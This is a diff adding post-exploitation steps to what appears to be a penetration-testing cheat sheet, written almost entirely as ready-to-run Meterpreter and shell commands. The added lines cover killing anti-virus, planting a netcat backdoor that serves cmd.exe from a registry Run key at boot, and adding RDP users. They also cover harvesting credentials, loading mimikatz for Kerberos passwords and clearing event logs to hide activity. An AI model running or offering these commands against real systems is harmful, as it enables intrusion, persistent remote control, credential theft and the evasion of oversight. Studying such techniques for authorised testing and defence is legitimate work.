@@ -1120,6 +1120,49 @@ You've got a shell! Now, what!?
   - Check for utilities (especially in Linux)
   - Route print (routing table `netstat -r`)
   - `tasklist`/`svc` (services running)
+- Use Meterpreter post exploitation scripts
+  - `enumdesktops` (running desktops)
+  - `migrate` (migrate to higher privilege process)
+  - `getsystem` (attempt to escalate privileges)
+  - `bypassuac` (attempt to bypass UAC, will fail in newer Windows)
+  - `incognito` (attempt to impersonate a user using a valid token)
+  - `list_tokens -u` (lists available tokens for impoersonation)
+- Install a backdoor (if allowed)
+  - Install `netcat`
+    - First kill the anti-virus
+    - Upload `nc.exe`
+      - From meterpreter: `upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32`
+  - Setup the backdoor at boot
+    - `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d 'C:\windows\system32\nc.exe -Ldp <PORT> -e cmd.exe' -v netcat`
+  - Connect to the victim machine
+    - `nc -v <IP ADDRESS> <PORT>`
+- Windows Target
+  - Enable remote desktop
+    - From meterpreter: `run getgui -e`
+  - Add users for rdp
+    - From meterpreter: `run getgui -u kevin -p pass`
+  - Test the access
+    - From meterpreter: `rdesktop -u <username> -p <password> <IP>`
+- Grab the data
+  - From meterpreter: `run winenum`
+- Grab credentials
+  - From meterpreter: `run post/windows/gather/credentials/credential_collector`
+- View recent files
+  - From meterpreter: `run post/windows/gather/dumplinks`
+- Installed applications
+  - From meterpreter: `run post/windows/gather/enum_applications`
+- Ask for exploit suggestions
+  - From meterpreter: `run post/multi/recon/local_exploit_suggester`
+- USB history
+  - From meterpreter: `run post/windows/gather/usb_history`
+- Event manager information
+  - From meterpreter: `run event_manager -i`
+- Clear the events log
+  - From meterpreter: `run event_manager -c`
+- Mimikatz
+  - Try to grab passwords
+  - From meterpreter: `load mimikatz`
+  - From meterpreter: `kerberos`
 
 | Command | Description |
 | --- | --- |
